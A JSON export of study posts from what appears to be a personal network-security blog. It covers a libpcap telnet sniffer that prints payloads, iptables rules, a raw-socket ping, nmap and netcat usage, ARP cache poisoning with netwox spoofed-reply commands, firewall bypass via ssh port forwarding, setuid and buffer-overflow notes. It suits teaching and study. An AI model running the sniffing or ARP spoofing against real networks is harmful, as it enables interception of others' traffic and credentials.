123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include&lt;stdio.h&gt;#include&lt;pcap.h&gt;#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;#include&lt;netinet/ip.h&gt;#include&lt;netinet/ip_icmp.h&gt;#include&lt;netinet/tcp.h&gt;#include&lt;netinet/udp.h&gt;#include&lt;netinet/ether.h&gt;#include&lt;arpa/inet.h&gt;/* #include&lt;pcap/bpf.h&gt; */#define ETHER_SIZE 14void get_packet(u_char*args, const struct pcap_pkthdr *header,const u_char *packet)&#123; static int count = 1; const char * payload; printf(\"packet number: %d\\n\",count++); struct ip * ip = (struct ip *)(packet + ETHER_SIZE); printf(\"IP header length: %d\\n\",ip-&gt;ip_hl&lt;&lt;2); printf(\"From %s\\n\",inet_ntoa(ip-&gt;ip_src)); printf(\"To %s\\n\",inet_ntoa(ip-&gt;ip_dst)); int ip_hl = ip-&gt;ip_hl&lt;&lt;2; switch(ip-&gt;ip_p)&#123; case IPPROTO_TCP: &#123; printf(\"Protocol TCP\\n\"); struct tcphdr *tcp = (struct tcphdr *)(packet + 14 + ip_hl); int h_size = tcp-&gt;doff*4; int payload_size = ntohs(ip-&gt;ip_len)-ip_hl-h_size; if(payload_size&gt;0)&#123; payload = (u_char *)(tcp+1); printf(\"payload is: %s\\n\",payload);&#125; break;&#125; case IPPROTO_UDP:printf(\"Protocol UDP\\n\");break; case IPPROTO_ICMP:printf(\"Protocol ICMP\\n\");break; case IPPROTO_IP:printf(\"Protocol IP\\n\");break; default:printf(\"Protocol unknown\\n\"); return; &#125; &#125;int main(int argc,char*argv[])&#123; char *dev, errbuf[PCAP_ERRBUF_SIZE]; struct bpf_program fp; char filter_exp[] = \"port 23\"; bpf_u_int32 mask; bpf_u_int32 net; struct pcap_pkthdr header; const u_char *packet; int num_packets = 10; dev = pcap_lookupdev(errbuf); if(dev==NULL)&#123; printf(\"ERROR:%s\\n\",errbuf); exit(2); &#125; printf(\"The sniff interface is:%s\\n\",dev); if(pcap_lookupnet(dev,&amp;net,&amp;mask,errbuf)==-1)&#123; printf(\"ERROR:%s\\n\",errbuf); net = 0; mask = 0; &#125; pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,0,errbuf); if(handle == NULL)&#123; printf(\"ERROR:%s\\n\",errbuf); exit(2); &#125; if(pcap_compile(handle,&amp;fp,filter_exp,0,net)==-1)&#123; printf(\"Can't parse filter %s:%s\\n\",filter_exp,pcap_geterr(handle)); return(2); &#125; if(pcap_setfilter(handle,&amp;fp)==-1)&#123; printf(\"cant' install filter %s:%s\\n\",filter_exp,pcap_geterr(handle)); return(2); &#125; printf(\"Hello\\n\"); // packet = pcap_next(handle,&amp;header);// printf(\"Get a packet with length %d.\\n\",header.len); pcap_loop(handle,num_packets,get_packet,NULL); pcap_freecode(&amp;fp); pcap_close(handle); return(0);&#125;","categories":[{"name":"it","slug":"it","permalink":"https://github.com/xmoyKING/categories/it/"}],"tags":[{"name":"network","slug":"network","permalink":"https://github.com/xmoyKING/tags/network/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"ip","slug":"ip","permalink":"https://github.com/xmoyKING/tags/ip/"},{"name":"icmp","slug":"icmp","permalink":"https://github.com/xmoyKING/tags/icmp/"},{"name":"ip/icmp","slug":"ip-icmp","permalink":"https://github.com/xmoyKING/tags/ip-icmp/"}]},{"title":"Web设计中网页字体排版指南","slug":"web-type-guidlines","date":"2017-06-21T09:21:48.000Z","updated":"2017-06-21T09:21:48.000Z","comments":true,"path":"2017/06/21/web-type-guidlines/","link":"","permalink":"https://github.com/xmoyKING/2017/06/21/web-type-guidlines/","excerpt":"","text":"本文译至Typographic Design Patterns And Best Practices总结部分。 Web设计中网页字体排版指南PDF，英文原件译者PS:主要讨论对英语的网页排版 总结在网页设计设置中字体，本文给出了一些通用指南，但并不是完全有科学依据的，而仅仅只是一个大致的指导： serif或sans-serif字体中的任何一种都可以用于文本正文和标题，但实际使用中，sans-serif字体更常用一些 标题常用字体： Georgia Arial Helvetica 正文常用字体： Georgia Arial Verdana Lucida Grande 标题字体大小在18-29像素 正文字体大小在12-14像素 标题字体大小与正文字体大小比例为1.96 行的高度与行字体大小比例为1.48 行的长度与行的高度比例为27.8 段落中单词空格与行高比例为0.754 每行的最佳字符数在55-75之间，但大多数为75-85之间译者PS:此指英文字符数量，不是单词数，一个中文字符占2个英文字符位 正文一般是左对齐的，少使用图片替代文本，链接需要有下划线或加粗高亮或用字体颜色高亮","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"typographic","slug":"typographic","permalink":"https://github.com/xmoyKING/tags/typographic/"},{"name":"translation","slug":"translation","permalink":"https://github.com/xmoyKING/tags/translation/"}]},{"title":"Linux IPtables Practice","slug":"iptables","date":"2017-06-20T07:46:48.000Z","updated":"2017-06-20T07:46:48.000Z","comments":true,"path":"2017/06/20/iptables/","link":"","permalink":"https://github.com/xmoyKING/2017/06/20/iptables/","excerpt":"","text":"Reference In Chinese:iptables超全详解 Stateful firewall Traditional:To allow outgoing website visiting and to drop other communicationTo allow input tcp with source port 80 and ackCan’t visit websites on ports other than 80 To use stateful firewallState tracking 12345sudo iptables -A OUTPUT -p tcp --dport 80 -j DROPsudo iptables -A INPUT -p udp -j ACCEPT (DNS)sudo iptables -A INPUT -i lo -j ACCEPTsudo iptables -A INPUT -p tcp --sport 80 --tcp-flags SYN,ACK,RST,FIN ACK -j ACCEPT Iptables Examples:iptables -A OUTPUT -p tcp --dport 23 -j DROPPrevent a machine from telneting to other machines iptables –A INPUT –p tcp –dport 23 –j DROPPrevent a telnet server from being connected by other machines iptables –A INPUT –p tcp –d 1.2.3.4 –j DROPPrevent inner network from connecting a social network 1.2.3.4 123sudo iptables -A INPUT -p icmp --icmp-type 8 -j DROPiptables -P INPUT DROPiptables -A INPUT -I eth0 -p icmp -m state --state ESTABLISH,RELATED -j ACCEPT Disable to be pinged, enable to ping 12iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 30/min --limit-burst 8 -j ACCEPTiptables -A INPUT -p icmp --icmp-type echo-request -j DROP To limit the number of pings sudo iptables -t nat -A POSTROUTING -p icmp --icmp-type 8 -j SNAT --to-source 192.168.137.131To change the source IP of a ping packet sent out from our machine sudo sysctl –p /etc/sysctl.confFind /etc/sysctl.conf To act as a firewall (protect inner network)To enable packet forward to redirect the input packet to a specific website To change the source and dst to change the reply packet to a specific source and port To change the source and dst12345678910sudo iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 202.38.64.3:80iptables -t nat -A PREROUTING -i ppp0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.200:80Iptables –t nat –A PREROUTING –p tcp –dport 8123 –j DNAT –to 192.168.141.235:80sudo iptables -t nat -A PREROUTING -p tcp --dport 8123 -j DNAT --to 192.168.141.235:80sudo iptables -t nat -A POSTROUTING -p tcp -s 192.168.141.1 -j SNAT --to 192.168.141.226sudo iptables -t nat -A PREROUTING -p tcp -s 192.168.141.235 --sport 80 -j DNAT --to 192.168.141.1sudo iptables -t nat -A POSTROUTING -p tcp -s 192.168.141.235 --sport 80 -j SNAT --to 192.168.141.226:8123 To stop conntrack12sudo iptables -t raw -A OUTPUT -j NOTRACKsudo iptables -t raw -A PREROUTING -j NOTRACK To act as a firewall (protect inner network)To enable packet forwardChange the .1 machine to the firewall itself123456sudo iptables -t nat -A PREROUTING -p tcp --dport 8123 -j DNAT --to 192.168.141.235:80sudo iptables -t nat -A POSTROUTING -p tcp -s 192.168.141.1 -j SNAT --to 192.168.141.226sudo iptables -t nat -A PREROUTING -p tcp -s 192.168.141.235 --sport 80 -j DNAT --to 192.168.141.1sudo iptables -t nat -A POSTROUTING -p tcp -s 192.168.141.235 --sport 80 -j SNAT --to 192.168.141.226:8123sudo iptables -t nat -A OUTPUT -p tcp --dport 8123 -j DNAT --to 192.168.141.235:80 To disable trafficTo enable ftp123Must enable ip_conntrack_ftp Modprobe ip_conntrack_ftp You should use ESTABLISHED and RELATED at the same time. Otherwise, either the command or the data connection can’t be established. the secure version of telnet: sshBesides encryption, ssh has another function: port forwardingUsing ssh port forwarding, firewall rules can be bypassed123sudo iptables -A INPUT -i lo -j ACCEPTsudo iptables –t nat –A OUTPUT –p tcp –dport 21 –j DEDIRECT –to-ports 7001 ftp server: only allows localhost ftp service Also demonstrate ftp data and control connections On the server, ftp is blocked On the client, we try to do ssh port forwarding123sudo iptables -t nat -A OUTPUT -p tcp --dport 21 -j DNAT --to-destination 127.0.0.1:7002ssh -L 7002:localhost:21 guoyan@192.168.137.151 Support squid to act as a web proxyiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 3128","categories":[{"name":"it","slug":"it","permalink":"https://github.com/xmoyKING/categories/it/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"network","slug":"network","permalink":"https://github.com/xmoyKING/tags/network/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"iptables","slug":"iptables","permalink":"https://github.com/xmoyKING/tags/iptables/"}]},{"title":"Raw Socket 原始套接字","slug":"raw-socket","date":"2017-06-17T07:26:35.000Z","updated":"2017-06-17T07:26:35.000Z","comments":true,"path":"2017/06/17/raw-socket/","link":"","permalink":"https://github.com/xmoyKING/2017/06/17/raw-socket/","excerpt":"","text":"Problems: Socket“sockets“ like that does not fit all our needs. lack some functionality some of which is given below: cannot read/write ICMP or IGMP protocols with normal sockets, ping(8) tool cannot be written using them. For IPv4 protocols other than ICMP, IGMP, TCP or UDP, What if we have a proprietary protocol that we want to handle? How do we send/receive data using that protocol? For hackers, how to construct special kind of packets for special purposes? What is raw socket? A different mechanism is needed: packets WITHOUT TCP/IP processing – raw packet allow user to bypass partly how computer handles TCP/IP. the packets were sent to the raw sockets user defines rather than the TCP/IP stack User should write program to wrap the data, e.g. to fill the headers, instead of kernel Raw sockets provide “privileged users” with the ability to directly access raw protocol Why Use Raw Socket?To conclude: Using higher-layer socket programming (connect, bind, listen, read, write), user has no control over the packets Raw sockets enables user to send spoofed IP packets, thus to build scanners etc. 4 layer network123456789---------------------------------------------------------- | 4. Application | telnet, ftp, dns etc. | -------------------------------------------------------- | 3. Transport | TCP UDP | ----------------------------------------------------------| 2. Network | IP ICMP IGMP | ---------------------------------------------------------- | 1. Link | device driver, network adapter | ---------------------------------------------------------- Link LayerVery first of the TCP/IP layers. When the packet is received off the wire, the early processing is done in here. Duties include: send/receive datagrams for the IP protocol send/receive ARP requests and replies for the ARP protocol send/receive RARP request and replies for the RARP protocol IP header/usr/include/netinet/ip.h:123456789101112struct ip &#123; u_int ip_hl:4, /* header length */ ip_v:4; /* ip version */ u_char ip_tos; /* type of service */ u_short ip_len; /* total length */ u_short ip_id; /* identification */ u_short ip_off; /* fragment offset */ u_char ip_ttl; /* time to live */ u_char ip_p; /* protocol */ u_short ip_sum; /* checksum */ struct in_addr ip_src,ip_dst; /* source and dest address */&#125;; IP header example123456789101112131415Field Length Example------------------------------ --------------- -------------------Version 4 bits 4Header length 4 bits 5Type of Service 8 bits 0Total length of the whole 16 bits 45datagramIdentification 16 bits 43211Flags 3 bits 0Fragment Offset 13 bits 0Time to Live (a.k.a TTL) 8 bits 64Layer III Protocol 8 bits 6 [TCP]Checksum 16 bits 0x3a43Source IP address 32 bits 192.168.1.1Destination IP address 32 bits 192.168.1.2 ICMP header/usr/include/netinet/ip_icmp.h:1234567891011121314151617181920struct icmphdr&#123; u_int8_t type; /* message type */ u_int8_t code; /* type sub-code */ u_int16_t checksum; union &#123; struct &#123; u_int16_t id; u_int16_t sequence; &#125; echo; /* echo datagram */ u_int32_t gateway; /* gateway address */ struct &#123; u_int16_t __unused; u_int16_t mtu; &#125; frag; /* path mtu discovery */ &#125; un;&#125;; ICMP header Example12345icmp-&gt;icmp_type = ICMP_ECHO;icmp-&gt;icmp_code = 0;icmp-&gt;icmp_cksum = 1;icmp-&gt;icmp_id = 2;icmp-&gt;icmp_seq = 3; RAW SOCKET APIJust like normal sockets, we create raw sockets with the socket(2) system call: int socket(int domain, int type, int protocol) type and protocol parameters are set to SOCK_RAW and protocol name accordingly: 123if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) &lt; 0) &#123; .. &#125; Write a simple ping:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;linux/tcp.h&gt;#include &lt;netinet/ip_icmp.h&gt;#include &lt;strings.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int sockfd;struct sockaddr_in target;unsigned short in_cksum(unsigned short *addr, int len)&#123; int sum=0; unsigned short res=0; while( len &gt; 1) &#123; sum += *addr++; len -=2; // printf(\"sum is %x.\\n\",sum); &#125; if( len == 1) &#123; *((unsigned char *)(&amp;res))=*((unsigned char *)addr); sum += res; &#125; sum = (sum &gt;&gt;16) + (sum &amp; 0xffff); sum += (sum &gt;&gt;16) ; res = ~sum; return res;&#125;int main(int argc, char * argv[])&#123; unsigned short seq=0; if(inet_aton(argv[1],&amp;target.sin_addr)==0)&#123; printf(\"bad ip address %s\\n\",argv[1]); exit(1); &#125; struct packet&#123;struct iphdr ip; struct icmphdr icmp;&#125;packet; bzero(&amp;packet, sizeof(packet)); if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))&lt;0) &#123;perror(\"socket()\\n\"); exit(1);&#125; packet.ip.version=4; packet.ip.ihl=5; packet.ip.tos=0; packet.ip.tot_len=htons(28); packet.ip.id=getpid(); packet.ip.frag_off=0; packet.ip.ttl=255; packet.ip.protocol=IPPROTO_ICMP; packet.ip.check=0; packet.ip.daddr=target.sin_addr.s_addr;// packet.ip.check=in_cksum((unsigned short*)&amp;packet.ip,20); packet.icmp.type=ICMP_ECHO; packet.icmp.code=0; packet.icmp.checksum=0; packet.icmp.un.echo.id=0; packet.icmp.un.echo.sequence=0; packet.icmp.un.echo.id=getpid()&amp;0xffff;while(1)&#123; packet.icmp.un.echo.sequence = seq++; packet.icmp.checksum = 0; packet.icmp.checksum = in_cksum((unsigned short *)&amp;packet.icmp,8); sendto(sockfd, &amp;packet, 28,0,(struct sockaddr *)&amp;target,sizeof(target)); sleep(1); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"network","slug":"network","permalink":"https://github.com/xmoyKING/tags/network/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"ip","slug":"ip","permalink":"https://github.com/xmoyKING/tags/ip/"},{"name":"icmp","slug":"icmp","permalink":"https://github.com/xmoyKING/tags/icmp/"},{"name":"ip/icmp","slug":"ip-icmp","permalink":"https://github.com/xmoyKING/tags/ip-icmp/"},{"name":"raw socket","slug":"raw-socket","permalink":"https://github.com/xmoyKING/tags/raw-socket/"},{"name":"ping","slug":"ping","permalink":"https://github.com/xmoyKING/tags/ping/"}]},{"title":"Linux Network Tools","slug":"linux-network-tools","date":"2017-06-15T02:09:30.000Z","updated":"2017-06-15T02:09:30.000Z","comments":true,"path":"2017/06/15/linux-network-tools/","link":"","permalink":"https://github.com/xmoyKING/2017/06/15/linux-network-tools/","excerpt":"","text":"主要总结了一些Linux下不熟悉但是却常用的网络工具,包括nc(NetCat),iptables(linux下的防火墙),raw socket(原始套接字), sniffer(嗅探器),以及ip/icmp报头格式。 Some instructsrouteConfigure or report status of host’s routing table123456route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.0.0 0.0.0.0 255.255.255.0 U 0 0 0 vmnet8127.0.0.0 0.0.0.0 255.0.0.0 U 0 0 0 lo route -? / man route - get help information tracerouteDetermines connectivity to a remote hostUses UDPOptions-f set initial ttl-F set don’t frag bit-I use echo request instead of UDP-t set type of service-v verbose output like Tracert in Windows nslookuponline web tool to lookup and find IP address information in the DNS (Domain Name System) hostForward and reverse DNS lookups whoiswhois is to discover who owns a website or domain name by searching WHOIS database.When you register a domain name, the Internet Corporation for Assigned Names and Numbers (ICANN) requires your domain name registrar to submit your personal contact information to the WHOIS database. Then the information will be public. netstatShow the status of all network connectionsShows all listening ports12345678910netstat -s statisticnetstat -p with pid;netstat -a list all ports;netstat -at list all tcp port;netstat -au list all udp ports;netstat -l list all listening ports;netstat -lt; netstat -lu;netstat -r display routing information;netstat -i interface information; tcpdumpPacket snifferInstalled with LinuxCommonly usedOften used as the data file for GUI backends Syntax:1234567891011121314151617tcpdump (options) –I (interface) –w (dump file) eg: tcpdump –c 1000 –i eth0 –w etho.dmpOPTIONS:-n do not convert host addresses to names-nn do not convert protocols and ports to names-i ethn listen on interface eth0, eth1, eth2-c xx exit after xx packets-e print link level info-f file_name read packets from file file_name-v slightly verbose-vv verbose-vvv very verbose-w file_name write packets to file file_name-x write packets in hex-X write packets in hex and ASCII-S write absolute sequence and acknowledgment numbers netcatReference In Chinese：Linux nc命令用法收集 Copies data across network connections.Uses UDP or TCP.Reliable and robust.Used directly at the command level.Can be driven by other programs and scripts.Very useful in forensic capture of a live system. Simple paradigm On the remote collecting system open a listening port. On current/compromised system pipe data to remote system. Connection is closed automatically after data transfer has completed. nc the swiss armyknife12nc -l 1234 (listen)nc localhost 1234 which will establish a communication tunnel;which is convenient way to talk to each other; when combined with redirection, it can be used to transfer file:12nc -l 1234 &gt; testcat file | nc localhost 1234 1echo -e \"GET / HTTP/1.0\\n\\n\" | nc localhost 80 which will show the homepage with header; nc doesn’t do https means it will show success with nc -vv localhost 443; but not homepage nmapReference In Chinese：Nmap扫描原理与用法 推荐阅读：快速入门原理+实践Nmap参考指南(Man Page) 详细介绍 Nmap is the most popular scanning tool used on the Internet.123456nmap localhostnmap localhost 192.168.137.221nmap 192.168.137.216-221nmap –O 192.168.137.221nmap –O 192.168.137.1 TCP SYN scanning这是Nmap默认的扫描方式，通常被称作半开放扫描(Half-open scanning)。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽(Filtered)。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。 TCP connect scanningTCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。 版本侦测原理简要的介绍版本的侦测原理。版本侦测主要分为以下几个步骤：首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。如果是TCP端口，尝试建立TCP连接。尝试等待片刻(通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms)。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包(即从nmap-services-probes中挑选合适的probe)，将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。 OS侦测原理Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。具体实现方式如下：Nmap内部包含了2600多已知系统的指纹特征(在文件nmap-os-db文件中)。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。 端口扫描指南之Idle Scan arpAddress Resolution Protocol: ARP and RARP12332 bit Internet address ↓ ARP ↑ RARP48 bit ethernet address ARP Protocol Flow： Machine A wants to send a packet to B, knowing only B’s IP address Machine A broadcasts ARP request with B’s IP address All machines on the local network receive the broadcast Machine B replies with its physical address Machine A adds B’s address information to its ARP table Machine A deliver packet directly to B ARP caching: To reduce communication cost, ARP maintain a cache of recently acquired IP-to-physical address bindings. Each entry has a timer (usually 20 minutes) Sender’s IP-to-address binding is included in every broadcast; receivers update the IP-to-physical address binding information in the cache before processing ARP packet ARP is stateless: system will update with a reply, regardless of request arp –a example:1234Internet Address Physical Address Type192.168.0.9 00-0b-cd-d3-6e-91 dynamic192.168.0.142 00-1e-90-be-ec-93 dynamic192.168.0.254 00-0b-45-f6-98-00 dynamic ARP Cache Poisoning：Sending a forged ARP reply, a target system would send frames destined for the victim to the attacker;There are various ways to conduct cache poisoning: broadcast, reply, gratuitous ARP message ARP: an attack example： ARP poisoning: Attacker impersonates a gateway, intercept the traffic, either send it to the actual default gateway (passive sniffing) or modify the data before forwarding it (man-in-the middle attack) DoS: by associating a nonexistent MAC address to the IP address of the victim’s default gateway NetwoxTool to send out network packets of different types and with different contents (Netwag is the GUI version)Netwox consists 222 tools, each with a specific number, some should work with root priviligeNetwox number [parameters …] 1netwox 72 --help Title: Scan ARP (EthIp spoof)Usage: netwox 72 -i ips [-d device] [-E eth] [-I ip]Parameters:12345-i|--ips ips list/range of IP addresses &#123;1.2.3.4,5.6.7.8&#125;-d|--device device spoof device &#123;Eth0&#125;-E|--src-eth eth source ethernet address &#123;0:a:a:a:a:a&#125;-I|--src-ip ip source IP address &#123;1.2.3.4&#125;--help2 display help for advanced parameters 1netwox 80 –eth –ip –eth-dst --ip-dst Title: Periodically send ARP repliesUsage: netwox 80 -e eth -i ip [-d device] [-E eth] [-I ip] [-s uint32]Parameters:1234567-e|--eth eth ethernet address &#123;00:0C:29:26:7F:F0&#125;-i|--ip ip IP address &#123;192.168.206.161&#125;-d|--device device device for spoof &#123;Eth0&#125;-E|--eth-dst eth to whom answer &#123;0:8:9:a:b:c&#125;-I|--ip-dst ip to whom answer &#123;5.6.7.8&#125;-s|--sleep uint32 sleep delay in ms &#123;1000&#125;--help2 display full help","categories":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"network","slug":"network","permalink":"https://github.com/xmoyKING/tags/network/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"natcat","slug":"natcat","permalink":"https://github.com/xmoyKING/tags/natcat/"},{"name":"nmap","slug":"nmap","permalink":"https://github.com/xmoyKING/tags/nmap/"}]},{"title":"Linux Uid","slug":"linux-uid","date":"2017-06-12T15:47:02.000Z","updated":"2017-06-12T15:47:02.000Z","comments":true,"path":"2017/06/12/linux-uid/","link":"","permalink":"https://github.com/xmoyKING/2017/06/12/linux-uid/","excerpt":"","text":"这里主要讨论三种uid，真实ruid(real user id), 有效euid(effective user id), 被保存的uid(saved user id)。 在UNIX系统中，能否访问文件的特权是基于用户id和组id的。当用户需要增加特权或者降低特权的时候，就需要更换用户ID或者组ID。一般的情况是使用过最小特权，以防止恶意用户攻击我们的程序获得不应当的特权。 1.实际用户ID和实际组ID标示我们实际上是谁；这两个字段是在登录时读取口令文件中的登录项。一般情况下，在一个会话期间，实际用户和实际组用户不会改变；但超级用户的进程可能改变它们。2.有效用户ID，有效组ID以及附加组ID决定了文件访问权限；3.保存的设置用户ID在执行程序时包含了有效用户ID的副本。 每个文件都有所有者和组所有者；当执行一个文件时，进程的有效用户ID通常就是实际用户ID，有效组ID通常是实际组ID。但是可以设置特殊标志，含义是“当执行此文件时，将进程的有效用户ID设置为文件所有者的ID”。因此，当文件设置了setuid之后，实际用户ID和有效用户ID可能是不同的，此时的有效用户ID是文件所有者的ID。 （APUE）关于文件访问权限：1.对文件的读写权限决定我们是否能够打开和读写该文件；2.为了在目录中创建新文件，需要对该目录有写和执行权限；3.为了删除目录中的文件，需要对目录有写和执行权限，但是对文件本身不需要具有读写权限； 进程每次打开、创建或者删除文件时，内核进行文件访问权限测试，这种测试设计文件的所有者，进程的有效ID。基本规则是：1.如进程的有效ID是0， 则允许访问；2.如果进程的有效ID等于文件的所有者ID，那么如果设置了文件的所有者权限位，则允许访问。3.如果进程的有效组ID是文件的组ID，则根据组权限判断。4.如果设置了其它用户的访问权限，则根据其它用户访问权限进行判断。 关于文件权限：1.根据mode，2.根据进程的effective uid。 我们通过一个例子来理解以上的描述。myecho程序，功能是向文件中写入一个字符串。以三个用户分别创建三个文件root.txt,user1.txt和user2.txt。登录用户为user1，即myecho的owner是user1.myecho可执行文件可以改变与自己的owner相同的文件；但是对另外两个文件没有读写权限。通过修改myecho的owner和set-uid，则不管哪个用户执行myecho，可以实现对另外两个文件的读写。譬如，将myecho的owner设置为root，并设置u+s，则普通用户user1和user2也可以使用myecho修改root.txt，因为此时的user1和user2的有效权限是root。当然，如果myecho的owner是root，并且设置了setuid，可以对三个文件进行读写。 Myecho程序，其它用户拥有执行权限，因此，当由其它用户执行时，也可以改变自己的文件。如果user1是myecho的owner，而myecho的执行权限是755，那么user2执行myecho时，可以改变user2.txt。 现在的问题是：user2首先想要修改user1.txt，所以myecho需要设置s位。另一方面，此时它还能修改user2.txt吗？（它的effective uid已经是user1） 关于setuid和seteuid。1.setuid(uid)首先请求内核将本进程的[真实uid],[有效uid]和[被保存的uid]都设置成函数指定的uid, 若权限不够则请求只将effective uid设置成uid, 再不行则调用失败.2.seteuid(uid)仅请求内核将本进程的[有效uid]设置成函数指定的uid.再具体来说setuid函数的话是这样的规则:1.当用户具有超级用户权限的时候,setuid 函数设置的id对三者都起效.[规则一]2.否则,仅当该id为real user ID 或者saved user ID时,该id对effective user ID起效.[规则二]3.否则,setuid函数调用失败. 区分setuid和seteuid可以结合放弃root权限来做例子。1.本来具有root权限，暂时性地降低权限到普通用户，然后返回root权限；以及2.本来具有root权限，然后永久地放弃root权限，再也返回不了root权限。 x.c，x1.c和x2.c三个程序，响应的可执行文件都已经设置为是root:root，4755.x.c中使用了seteuid，暂时地改变了effective uid，但是saved uid依然是root；因此之后可以通过setuid或者seteuid将它变回root；x1.c使用了setuid，因为此时的effective uid是0，所以同时改变了ruid，euid和suid三者。 关于saved uid。 最后关于chmod 7755，或者1755。如果一个文件夹是公共文件夹，那么它的权限可能是777，也即所有人可读写执行。所有人都可以在这个目录下创建自己的文件，但同时，任何人也可以删除其他人创建的文件，虽然不能写。为了防止在公共文件夹下删除他人的文件，可以对文件夹设置sticky位。Chmod 1777来设置。此时，用户只能删除自己的文件。（如果某个公共文件夹是某个普通用户，则该普通用户可以删除其它用户的文件，即使设置了粘滞位）","categories":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"uid","slug":"uid","permalink":"https://github.com/xmoyKING/tags/uid/"}]},{"title":"缓冲区溢出攻击获取Root Shell原理","slug":"smashing-stack","date":"2017-06-10T01:25:05.000Z","updated":"2017-06-10T01:25:05.000Z","comments":true,"path":"2017/06/10/smashing-stack/","link":"","permalink":"https://github.com/xmoyKING/2017/06/10/smashing-stack/","excerpt":"","text":"本文主要学习内容为”利用缓冲区溢出获取Root Shell”,结合译文以及原文做出笔记和备注,目的是了解堆栈的顺序以及每个函数调用顺序和返回地址，同时需要注意如何防止缓冲区溢出攻击。 参考博客：缓冲区溢出攻击原理分析 参考译文：smashing the stack for fun and profit 译文PDF原件:smashing-stack.pdf 什么是routine【参考百度百科：例程】，简单理解就是对外提供服务的API，实际就是一个个可复用的函数。 从理论上来说, 局部变量可以用堆栈指针（SP）加偏移量来引用.然而, 当有字被压栈和出栈后, 这些偏移量就变了. 即SP的位置是不断变化的，由于SP始终在栈顶，每次push和pop都会导致SP的位置改变。即ESP指针。 从FP的位置开始计算, 函数参数的偏移量是正值, 而局部变量的偏移量是负值.当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以恢复). 然后它把SP复制到FP, 创建新的FP.这个新的FP就是EBP位置 即由于每次调用其他函数都需将新函数的参数和局部变量入栈,由于堆栈是高地址向低地址增长,而函数调用入栈的顺序为: 函数形参-调用(SP)-局部变量. 所以结果为函数形参的地址比SP高, 而SP地址又比局部变量高, 所以对FP来说,参数偏移量为正, 局部变量偏移量为负 Shell Code 小节处的堆栈图示没看懂，需要解释 使用NOP填充字符串前部可使执行特定地址代码的概率大大增加 防御方式： 堆栈保护（即堆栈不可执行） 解决方法：可使用关闭堆栈保护选项绕过 使用Canary方法（即在某个寄存器中保存返回地址的快照，函数返回时对比快照，一致则正常，不一致则报错） 只有少部分使用此方式，无法避免所有的缓冲区攻击 正确编码风格，执行边界检查 